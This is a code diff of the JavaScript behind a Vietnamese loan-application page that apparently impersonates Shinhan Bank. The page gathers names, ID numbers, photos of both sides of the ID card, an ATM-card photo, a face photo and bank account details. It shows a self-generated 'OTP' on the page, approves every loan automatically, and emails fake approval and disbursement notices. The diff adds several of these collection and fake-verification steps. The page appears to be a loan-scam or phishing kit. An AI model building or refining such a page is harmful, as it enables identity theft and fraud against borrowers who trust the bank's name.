-                return `SHB-${year}${month}${day}-${random}`;
-            } catch (error) {
-                console.error("Lỗi tạo mã hồ sơ:", error);
-                return "SHB-DEFAULT-000000";
-            }
-        }
-
-        $('#income, #loanAmount').on('input', function() {
-            try {
-                let value = $(this).val().replace(/[^0-9]/g, '');
-                if (value) {
-                    value = parseInt(value).toLocaleString('vi-VN');
-                    $(this).val(value);
-                }
-            } catch (error) {
-                console.error("Lỗi format số:", error);
-            }
-        });
 
         $('#registerForm').on('submit', async function(e) {
             try {
                 e.preventDefault();
-                const $submitBtn = $(this).find('button[type="submit"]');
+                const $form = $(this);
+                const $submitBtn = $form.find('button[type="submit"]');
                 $submitBtn.addClass('loading').prop('disabled', true);
-                if (!$('#termsAgree').is(':checked')) {
-                    showToast("Vui lòng đồng ý với các điều khoản và điều kiện!", false);
-                    $submitBtn.removeClass('loading').prop('disabled', false);
-                    return;
-                }
-                if (!this.checkValidity()) {
-                    const invalidFields = $(this).find(':invalid');
-                    let errorMessage = "Vui lòng điền đầy đủ thông tin: ";
-                    invalidFields.each(function() {
-                        const label = $(this).siblings('label').text() || $(this).attr('id');
-                        errorMessage += `${label}, `;
-                    });
-                    showToast(errorMessage.slice(0, -2), false);
-                    $(this).addClass('was-validated');
-                    $submitBtn.removeClass('loading').prop('disabled', false);
-                    return;
-                }
-                let income = $('#income').val().replace(/[^0-9]/g, '') || '0';
-                let loanAmount = $('#loanAmount').val().replace(/[^0-9]/g, '') || '0';
-                if (parseInt(income) < 8000000) {
-                    showToast("Thu nhập tối thiểu phải là 8,000,000 VND!", false);
-                    $('#income').addClass('is-invalid');
-                    $submitBtn.removeClass('loading').prop('disabled', false);
-                    return;
-                }
-                if (parseInt(loanAmount) < 10000000) {
-                    showToast("Số tiền vay tối thiểu phải là 10,000,000 VND!", false);
-                    $('#loanAmount').addClass('is-invalid');
-                    $submitBtn.removeClass('loading').prop('disabled', false);
-                    return;
-                }
                 userData = {
-                    fullName: $('#fullName').val(),
-                    idNumber: $('#idNumber').val(),
-                    idIssueDate: $('#idIssueDate').val() || 'Không Cung Cấp',
-                    idIssuePlace: $('#idIssuePlace').val() || 'Không Cung Cấp',
-                    address: $('#address').val(),
-                    occupation: $('#occupation').val(),
-                    income: income,
-                    phoneNumber: $('#phoneNumber').val(),
-                    email: $('#email').val(),
-                    loanAmount: loanAmount,
-                    loanTerm: $('#loanTerm').val(),
-                    loanPurpose: $('#loanPurpose').val(),
-                    accountNumber: $('#accountNumber').val(),
-                    bankName: $('#bankName').val(),
+                    fullName: $('#fullName').val().trim() || 'Không cung cấp',
+                    idNumber: $('#idNumber').val().trim() || 'Không cung cấp',
+                    idIssueDate: $('#idIssueDate').val() || 'Không cung cấp',
+                    idIssuePlace: $('#idIssuePlace').val().trim() || 'Không cung cấp',
+                    address: $('#address').val().trim() || 'Không cung cấp',
+                    occupation: $('#occupation').val() || 'Không cung cấp',
+                    income: parseInt($('#income').val().replace(/,/g, '')) || 0,
+                    phoneNumber: $('#phoneNumber').val().trim() || 'Không cung cấp',
+                    email: $('#email').val().trim() || 'Không cung cấp',
+                    loanAmount: parseInt($('#loanAmount').val().replace(/,/g, '')) || 0,
+                    loanTerm: $('#loanTerm').val() || '12',
+                    loanPurpose: $('#loanPurpose').val() || 'Không cung cấp',
+                    accountNumber: $('#accountNumber').val().trim() || 'Không cung cấp',
+                    bankName: $('#bankName').val() || 'Không cung cấp',
+                    creditHistory: $('#creditHistory').val() || 'Không cung cấp',
                     termsAgree: $('#termsAgree').is(':checked'),
-                    loanCode: generateLoanCode(),
-                    registrationDate: getCurrentDate(),
-                    monthlyPayment: calculateMonthlyPayment(loanAmount, $('#loanTerm').val()),
-                    interestRate: calculateInterestRate(loanAmount),
-                    sellerCode: generateRandomCode(),
-                    storeCode: generateRandomCode(),
-                    staffCode: generateRandomCode(),
-                    staffName: "Nguyễn Thị Mỹ Duyên",
-                    branchName: "Chi nhánh Shinhanbank Đà Nẵng",
-                    isRegistered: true
+                    isRegistered: true,
+                    loanCode: generateRandomCode(),
+                    interestRate: calculateInterestRate($('#loanAmount').val()),
+                    monthlyPayment: calculateMonthlyPayment($('#loanAmount').val(), $('#loanTerm').val()),
+                    registrationDate: getCurrentDate()
                 };
-                await new Promise(resolve => setTimeout(resolve, 500)); // Giả lập thời gian xử lý
+                saveToLocalStorage(2);
+                await new Promise(resolve => setTimeout(resolve, 500));
+                showToast("Thông tin đã được lưu!", true);
                 proceedToStep(1, 2, 20);
                 $submitBtn.removeClass('loading').prop('disabled', false);
             } catch (error) {
-                console.error("Lỗi bước 1:", error);
-                showToast("Lỗi xử lý hồ sơ. Vui lòng thử lại!", false);
-                $(this).find('button[type="submit"]').removeClass('loading').prop('disabled', false);
+                console.error("Lỗi xử lý form đăng ký:", error);
+                showToast("Lỗi xử lý đăng ký. Vui lòng thử lại!", false);
+                $submitBtn.removeClass('loading').prop('disabled', false);
+            }
+        });
+
+        $('#idFrontImage').on('change', function() {
+            try {
+                const file = this.files[0];
+                if (file) {
+                    $('#idFrontInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
+                } else {
+                    $('#idFrontInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
+                }
+            } catch (error) {
+                console.error("Lỗi xử lý file mặt trước:", error);
+                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
+            }
+        });
+
+        $('#idBackImage').on('change', function() {
+            try {
+                const file = this.files[0];
+                if (file) {
+                    $('#idBackInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
+                } else {
+                    $('#idBackInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
+                }
+            } catch (error) {
+                console.error("Lỗi xử lý file mặt sau:", error);
+                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
             }
         });
 
@@ -1148,19 +1141,47 @@
                 $btn.addClass('loading').prop('disabled', true);
                 const idFrontImage = $('#idFrontImage')[0].files[0];
                 const idBackImage = $('#idBackImage')[0].files[0];
-                if (!await validateImage(idFrontImage, 'idFrontImage') || !await validateImage(idBackImage, 'idBackImage')) {
+                if (!idFrontImage || !idBackImage) {
+                    showToast("Vui lòng tải lên cả hai hình ảnh!", false);
                     $btn.removeClass('loading').prop('disabled', false);
                     return;
                 }
-                userData.idFrontImage = await compressImage(idFrontImage);
-                userData.idBackImage = await compressImage(idBackImage);
-                await new Promise(resolve => setTimeout(resolve, 500));
+                const isFrontValid = await validateImage(idFrontImage, 'idFrontImage');
+                const isBackValid = await validateImage(idBackImage, 'idBackImage');
+                if (!isFrontValid || !isBackValid) {
+                    $btn.removeClass('loading').prop('disabled', false);
+                    return;
+                }
+                const compressedFront = await compressImage(idFrontImage);
+                const compressedBack = await compressImage(idBackImage);
+                if (!compressedFront || !compressedBack) {
+                    $btn.removeClass('loading').prop('disabled', false);
+                    return;
+                }
+                userData.idFrontImage = compressedFront;
+                userData.idBackImage = compressedBack;
+                saveToLocalStorage(3);
+                showToast("Hình ảnh đã được lưu!", true);
                 proceedToStep(2, 3, 30);
                 $btn.removeClass('loading').prop('disabled', false);
             } catch (error) {
-                console.error("Lỗi bước 2:", error);
-                showToast("Lỗi tải lên giấy tờ. Vui lòng thử lại!", false);
-                $(this).removeClass('loading').prop('disabled', false);
+                console.error("Lỗi xử lý bước 2:", error);
+                showToast("Lỗi xử lý hình ảnh. Vui lòng thử lại!", false);
+                $btn.removeClass('loading').prop('disabled', false);
+            }
+        });
+
+        $('#atmImage').on('change', function() {
+            try {
+                const file = this.files[0];
+                if (file) {
+                    $('#atmImageInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
+                } else {
+                    $('#atmImageInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
+                }
+            } catch (error) {
+                console.error("Lỗi xử lý file thẻ ATM:", error);
+                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
             }
         });
 
@@ -1169,18 +1190,55 @@
                 const $btn = $(this);
                 $btn.addClass('loading').prop('disabled', true);
                 const atmImage = $('#atmImage')[0].files[0];
-                if (!await validateImage(atmImage, 'atmImage')) {
+                if (!atmImage) {
+                    showToast("Vui lòng tải lên hình ảnh thẻ ATM!", false);
                     $btn.removeClass('loading').prop('disabled', false);
                     return;
                 }
-                userData.atmImage = await compressImage(atmImage);
-                await new Promise(resolve => setTimeout(resolve, 500));
+                const isValid = await validateImage(atmImage, 'atmImage');
+                if (!isValid) {
+                    $btn.removeClass('loading').prop('disabled', false);
+                    return;
+                }
+                const compressedAtm = await compressImage(atmImage);
+                if (!compressedAtm) {
+                    $btn.removeClass('loading').prop('disabled', false);
+                    return;
+                }
+                userData.atmImage = compressedAtm;
+                saveToLocalStorage(4);
+                showToast("Hình ảnh thẻ ATM đã được lưu!", true);
                 proceedToStep(3, 4, 40);
                 $btn.removeClass('loading').prop('disabled', false);
             } catch (error) {
-                console.error("Lỗi bước 3:", error);
-                showToast("Lỗi tải lên thẻ ATM. Vui lòng thử lại!", false);
-                $(this).removeClass('loading').prop('disabled', false);
+                console.error("Lỗi xử lý bước 3:", error);
+                showToast("Lỗi xử lý hình ảnh. Vui lòng thử lại!", false);
+                $btn.removeClass('loading').prop('disabled', false);
+            }
+        });
+
+        $('#faceImage').on('change', function() {
+            try {
+                const file = this.files[0];
+                if (file) {
+                    $('#faceImageInfo').text(`Tệp: ${file.name}, Kích thước: ${(file.size / 1024 / 1024).toFixed(2)} MB`);
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        userData.faceImageUrl = e.target.result;
+                        $('#profileImagePreview').html(`<img src="${e.target.result}" alt="Hình ảnh khuôn mặt" />`);
+                        saveToLocalStorage(userData.currentStep || 4);
+                    };
+                    reader.onerror = function() {
+                        showToast("Lỗi đọc ảnh khuôn mặt!", false);
+                    };
+                    reader.readAsDataURL(file);
+                } else {
+                    $('#faceImageInfo').text('Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px');
+                    $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
+                }
+            } catch (error) {
+                console.error("Lỗi xử lý file ảnh khuôn mặt:", error);
+                showToast("Lỗi xử lý file. Vui lòng thử lại!", false);
             }
         });
 
@@ -1189,22 +1247,33 @@
                 const $btn = $(this);
                 $btn.addClass('loading').prop('disabled', true);
                 const faceImage = $('#faceImage')[0].files[0];
-                if (!await validateImage(faceImage, 'faceImage')) {
+                if (!faceImage) {
+                    showToast("Vui lòng tải lên ảnh khuôn mặt!", false);
                     $btn.removeClass('loading').prop('disabled', false);
                     return;
                 }
-                userData.faceImage = await compressImage(faceImage);
-                const otp = Math.floor(100000 + Math.random() * 900000);
+                const isValid = await validateImage(faceImage, 'faceImage');
+                if (!isValid) {
+                    $btn.removeClass('loading').prop('disabled', false);
+                    return;
+                }
+                const compressedFace = await compressImage(faceImage);
+                if (!compressedFace) {
+                    $btn.removeClass('loading').prop('disabled', false);
+                    return;
+                }
+                const otp = generateRandomCode();
                 $('#otpDisplay').text(otp);
-                userData.otp = otp.toString();
+                userData.otp = otp;
+                userData.faceImage = compressedFace;
                 saveToLocalStorage(5);
-                await new Promise(resolve => setTimeout(resolve, 500));
+                showToast("Mã OTP đã được gửi!", true);
                 proceedToStep(4, 5, 50);
                 $btn.removeClass('loading').prop('disabled', false);
             } catch (error) {
-                console.error("Lỗi bước 4:", error);
+                console.error("Lỗi xử lý bước 4:", error);
                 showToast("Lỗi xử lý ảnh khuôn mặt. Vui lòng thử lại!", false);
-                $(this).removeClass('loading').prop('disabled', false);
+                $btn.removeClass('loading').prop('disabled', false);
             }
         });
 
@@ -1222,6 +1291,19 @@
             }
         }
 
+        function resendOtp() {
+            try {
+                const newOtp = generateRandomCode();
+                $('#otpDisplay').text(newOtp);
+                userData.otp = newOtp;
+                saveToLocalStorage(5);
+                showToast("Mã OTP mới đã được gửi!", true);
+            } catch (error) {
+                console.error("Lỗi gửi lại OTP:", error);
+                showToast("Lỗi gửi lại OTP. Vui lòng thử lại!", false);
+            }
+        }
+
         function copySignOtp() {
             try {
                 const otp = $('#signOtpDisplay').text();
@@ -1231,31 +1313,32 @@
                     showToast("Lỗi khi sao chép mã OTP!", false);
                 });
             } catch (error) {
-                console.error("Lỗi sao chép OTP ký hợp đồng:", error);
+                console.error("Lỗi sao chép OTP:", error);
                 showToast("Lỗi khi sao chép mã OTP!", false);
             }
         }
 
-        async function sendEmail(serviceId, templateId, params, maxRetries = 3) {
+        function resendSignOtp() {
             try {
-                for (let attempt = 1; attempt <= maxRetries; attempt++) {
-                    try {
-                        const response = await emailjs.send(serviceId, templateId, params);
-                        showToast("Email đã được gửi!", true);
-                        return response;
-                    } catch (error) {
-                        console.error(`Lỗi gửi email (lần ${attempt}):`, error);
-                        if (attempt === maxRetries) {
-                            showToast("Không thể gửi email. Vui lòng liên hệ hỗ trợ!", false);
-                            return null;
-                        }
-                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-                    }
-                }
+                const newOtp = generateRandomCode();
+                $('#signOtpDisplay').text(newOtp);
+                userData.signOtp = newOtp;
+                saveToLocalStorage('8-1');
+                showToast("Mã OTP mới đã được gửi!", true);
+            } catch (error) {
+                console.error("Lỗi gửi lại OTP ký hợp đồng:", error);
+                showToast("Lỗi gửi lại OTP. Vui lòng thử lại!", false);
+            }
+        }
+
+        async function sendEmail(serviceId, templateId, params) {
+            try {
+                await emailjs.send(serviceId, templateId, params);
+                showToast("Email đã được gửi thành công!", true);
             } catch (error) {
                 console.error("Lỗi gửi email:", error);
                 showToast("Lỗi gửi email. Vui lòng thử lại!", false);
-                return null;
+                throw error;
             }
         }
 
@@ -1265,104 +1348,35 @@
                 $btn.addClass('loading').prop('disabled', true);
                 const enteredOtp = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val() + $('#otp5').val() + $('#otp6').val();
                 if (enteredOtp === userData.otp) {
-                    showToast("Xác nhận OTP thành công!", true);
+                    showToast("Xác minh OTP thành công!", true);
                     const emailParams = {
                         to_email: userData.email,
                         full_name: userData.fullName,
                         loan_amount: formatNumber(userData.loanAmount) + ' VND',
                         loan_code: userData.loanCode,
-                        registration_date: userData.registrationDate,
                         monthly_payment: userData.monthlyPayment,
                         interest_rate: userData.interestRate,
-                        loan_term: userData.loanTerm + ' tháng',
-                        loan_purpose: userData.loanPurpose
+                        loan_term: userData.loanTerm + ' tháng'
                     };
                     await sendEmail('service_loan', 'template_approval', emailParams);
-                    $('#confirmationMessage').text(`Mã hồ sơ: ${userData.loanCode} - Số tiền được duyệt: ${formatNumber(userData.loanAmount)} VND`);
+                    $('#confirmationMessage').text(`Hồ sơ vay của bạn đã được duyệt với số tiền ${formatNumber(userData.loanAmount)} VND.`);
                     $('#confirmationEmail').text(userData.email);
                     $('#modalFullName').text(`Họ và tên: ${userData.fullName}`);
                     $('#modalLoanAmount').text(`Số tiền vay: ${formatNumber(userData.loanAmount)} VND`);
                     $('#modalLoanCode').text(`Mã hồ sơ: ${userData.loanCode}`);
                     const successModal = new bootstrap.Modal(document.getElementById('successModal'));
                     successModal.show();
+                    userData.contractImageUrl = formData.contractImage;
+                    saveToLocalStorage(7);
+                    proceedToStep(5, 7, 60);
                 } else {
-                    showToast("Mã OTP không đúng!", false);
+                    showToast("Mã OTP không đúng. Vui lòng thử lại!", false);
                 }
                 $btn.removeClass('loading').prop('disabled', false);
             } catch (error) {
-                console.error("Lỗi xác nhận OTP:", error);
-                showToast("Lỗi xác nhận OTP. Vui lòng thử lại!", false);
-                $(this).removeClass('loading').prop('disabled', false);
-            }
-        });
-
-        function renderCanvas(canvasId, imageUrl, userData) {
-            try {
-                const canvas = document.getElementById(canvasId);
-                canvas.classList.add('loading');
-                const ctx = canvas.getContext('2d');
-                const img = new Image();
-                img.crossOrigin = "Anonymous";
-                img.src = imageUrl;
-
-                img.onload = function() {
-                    const scale = Math.max(window.devicePixelRatio ||1, 2);
-                    canvas.width = img.width * scale;
-                    canvas.height = img.height * scale;
-                    ctx.imageSmoothingEnabled = true; // Bật smoothing cho ảnh
-                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-
-                    // Vẽ text với độ nét cao
-                    ctx.imageSmoothingEnabled = false; // Tắt smoothing cho text
-                    ctx.font = `${24 * scale}px Roboto`;
-                    ctx.fillStyle = '#000000';
-                    ctx.textAlign = 'left';
-
-                    // Thông tin hiển thị trên canvas (tùy thuộc vào bước)
-                    const info = [
-                        `Họ và Tên: ${userData.fullName || 'Không Cung Cấp'}`,
-                        `Số CMND/CCCD: ${userData.idNumber || 'Không Cung Cấp'}`,
-                        `Số Tiền Vay: ${formatNumber(userData.loanAmount)} VND`,
-                        `Kỳ Hạn Vay: ${userData.loanTerm || 'Không Cung Cấp'} tháng`,
-                        `Mã Hồ Sơ: ${userData.loanCode || 'Không Cung Cấp'}`,
-                        `Ngày Đăng Ký: ${userData.registrationDate || 'Không Cung Cấp'}`
-                    ];
-
-                    info.forEach((text, index) => {
-                        ctx.fillText(text, 50 * scale, (100 + index * 40) * scale);
-                    });
-
-                    // Lưu canvas dưới dạng ảnh chất lượng cao
-                    if (canvasId === 'contractCanvas') {
-                        userData.contractImageUrl = canvas.toDataURL('image/jpeg', 0.9);
-                    }
-                    saveToLocalStorage(userData.currentStep);
-                    canvas.classList.remove('loading');
-                };
-
-                img.onerror = function() {
-                    console.error(`Lỗi tải ảnh ${imageUrl}`);
-                    showToast("Lỗi tải ảnh tài liệu. Sử dụng ảnh mặc định!", false);
-                    img.src = formData.fallbackImage;
-                };
-            } catch (error) {
-                console.error(`Lỗi render canvas ${canvasId}:`, error);
-                showToast("Lỗi hiển thị tài liệu. Vui lòng thử lại!", false);
-                document.getElementById(canvasId).classList.remove('loading');
-            }
-        }
-
-        $('#proceedToContractBtn').on('click', async function() {
-            try {
-                const $btn = $(this);
-                $btn.addClass('loading').prop('disabled', true);
-                await new Promise(resolve => setTimeout(resolve, 500));
-                proceedToStep(7, 8, 70);
+                console.error("Lỗi xác minh OTP:", error);
+                showToast("Lỗi xác minh OTP. Vui lòng thử lại!", false);
                 $btn.removeClass('loading').prop('disabled', false);
-            } catch (error) {
-                console.error("Lỗi bước 7:", error);
-                showToast("Lỗi xem hợp đồng. Vui lòng thử lại!", false);
-                $(this).removeClass('loading').prop('disabled', false);
             }
         });
 
@@ -1378,9 +1392,9 @@
                 proceedToStep(8, '8-1', 80);
                 $btn.removeClass('loading').prop('disabled', false);
             } catch (error) {
-                console.error("Lỗi bước 8:", error);
-                showToast("Lỗi xử lý hợp đồng. Vui lòng thử lại!", false);
-                $(this).removeClass('loading').prop('disabled', false);
+                console.error("Lỗi chuyển sang ký hợp đồng:", error);
+                showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
+                $btn.removeClass('loading').prop('disabled', false);
             }
         });
 
@@ -1390,29 +1404,29 @@
                 $btn.addClass('loading').prop('disabled', true);
                 const enteredSignOtp = $('#signOtp1').val() + $('#signOtp2').val() + $('#signOtp3').val() + $('#signOtp4').val() + $('#signOtp5').val() + $('#signOtp6').val();
                 if (enteredSignOtp === userData.signOtp) {
-                    showToast("Xác nhận ký hợp đồng thành công!", true);
+                    showToast("Xác nhận OTP ký hợp đồng thành công!", true);
                     const emailParams = {
                         to_email: userData.email,
                         full_name: userData.fullName,
                         loan_amount: formatNumber(userData.loanAmount) + ' VND',
                         loan_code: userData.loanCode,
-                        registration_date: userData.registrationDate,
+                        contract_id: generateContractId(),
+                        signing_date: getCurrentDate(),
                         monthly_payment: userData.monthlyPayment,
                         interest_rate: userData.interestRate,
-                        loan_term: userData.loanTerm + ' tháng',
-                        loan_purpose: userData.loanPurpose
+                        loan_term: userData.loanTerm + ' tháng'
                     };
                     await sendEmail('service_loan', 'template_contract', emailParams);
                     await new Promise(resolve => setTimeout(resolve, 500));
                     proceedToStep('8-1', 9, 90);
                 } else {
-                    showToast("Mã OTP không đúng!", false);
+                    showToast("Mã OTP không đúng. Vui lòng thử lại!", false);
                 }
                 $btn.removeClass('loading').prop('disabled', false);
             } catch (error) {
-                console.error("Lỗi xác nhận OTP ký hợp đồng:", error);
-                showToast("Lỗi xác nhận OTP. Vui lòng thử lại!", false);
-                $(this).removeClass('loading').prop('disabled', false);
+                console.error("Lỗi xác minh OTP ký hợp đồng:", error);
+                showToast("Lỗi xác minh OTP. Vui lòng thử lại!", false);
+                $btn.removeClass('loading').prop('disabled', false);
             }
         });
 
@@ -1425,31 +1439,73 @@
                     full_name: userData.fullName,
                     loan_amount: formatNumber(userData.loanAmount) + ' VND',
                     loan_code: userData.loanCode,
-                    registration_date: userData.registrationDate,
-                    monthly_payment: userData.monthlyPayment,
-                    interest_rate: userData.interestRate,
-                    loan_term: userData.loanTerm + ' tháng',
-                    loan_purpose: userData.loanPurpose
+                    account_number: userData.accountNumber,
+                    bank_name: userData.bankName,
+                    disbursement_date: getCurrentDate(),
+                    monthly_payment: userData.monthlyPayment
                 };
-                await sendEmail('service_loan', 'template_completion', emailParams);
+                await sendEmail('service_loan', 'template_disbursement', emailParams);
                 await new Promise(resolve => setTimeout(resolve, 500));
                 proceedToStep(9, 10, 100);
                 $btn.removeClass('loading').prop('disabled', false);
             } catch (error) {
-                console.error("Lỗi bước 9:", error);
-                showToast("Lỗi hoàn tất đăng ký. Vui lòng thử lại!", false);
-                $(this).removeClass('loading').prop('disabled', false);
+                console.error("Lỗi hoàn tất:", error);
+                showToast("Lỗi hoàn tất. Vui lòng thử lại!", false);
+                $btn.removeClass('loading').prop('disabled', false);
             }
         });
 
-        // Xử lý nhập OTP
+        function renderCanvas(canvasId, imageUrl, data) {
+            try {
+                const canvas = document.getElementById(canvasId);
+                if (!canvas) {
+                    console.error(`Canvas ${canvasId} không tồn tại`);
+                    return;
+                }
+                const ctx = canvas.getContext('2d');
+                const img = new Image();
+                canvas.classList.add('loading');
+                img.crossOrigin = "Anonymous";
+                img.onload = function() {
+                    canvas.width = img.width;
+                    canvas.height = img.height;
+                    ctx.drawImage(img, 0, 0);
+                    ctx.font = 'bold 30px Roboto';
+                    ctx.fillStyle = '#003087';
+                    ctx.textAlign = 'left';
+                    const fields = [
+                        { x: 100, y: 100, text: `Họ và Tên: ${data.fullName || 'Không Cung Cấp'}` },
+                        { x: 100, y: 150, text: `Số CMND/CCCD: ${data.idNumber || 'Không Cung Cấp'}` },
+                        { x: 100, y: 200, text: `Số Tiền Vay: ${formatNumber(data.loanAmount)} VND` },
+                        { x: 100, y: 250, text: `Kỳ Hạn: ${data.loanTerm || 'Không Cung Cấp'} tháng` },
+                        { x: 100, y: 300, text: `Mã Hồ Sơ: ${data.loanCode || 'Không Cung Cấp'}` },
+                        { x: 100, y: 350, text: `Ngày Đăng Ký: ${data.registrationDate || 'Không Cung Cấp'}` }
+                    ];
+                    fields.forEach(field => {
+                        ctx.fillText(field.text, field.x, field.y);
+                    });
+                    canvas.classList.remove('loading');
+                };
+                img.onerror = function() {
+                    console.error(`Lỗi tải ảnh ${imageUrl}`);
+                    img.src = formData.fallbackImage;
+                };
+                img.src = imageUrl;
+            } catch (error) {
+                console.error(`Lỗi render canvas ${canvasId}:`, error);
+                showToast("Lỗi hiển thị tài liệu. Vui lòng thử lại!", false);
+            }
+        }
+
         $('.otp-digit').on('input', function() {
             try {
-                if (this.value.length === 1) {
-                    const nextInput = $(this).next('.otp-digit');
-                    if (nextInput.length) {
-                        nextInput.focus();
-                    }
+                const $this = $(this);
+                const value = $this.val();
+                if (value.length === 1 && $this.next('.otp-digit').length) {
+                    $this.next('.otp-digit').focus();
+                }
+                if (!/^[0-9]$/.test(value)) {
+                    $this.val('');
                 }
             } catch (error) {
                 console.error("Lỗi xử lý OTP input:", error);
@@ -1458,14 +1514,11 @@
 
         $('.otp-digit').on('keydown', function(e) {
             try {
-                if (e.key === 'Backspace' && !this.value) {
-                    const prevInput = $(this).prev('.otp-digit');
-                    if (prevInput.length) {
-                        prevInput.focus();
-                    }
+                if (e.key === 'Backspace' && !$(this).val() && $(this).prev('.otp-digit').length) {
+                    $(this).prev('.otp-digit').focus();
                 }
             } catch (error) {
-                console.error("Lỗi xử lý OTP backspace:", error);
+                console.error("Lỗi xử lý OTP keydown:", error);
             }
         });
     </script>
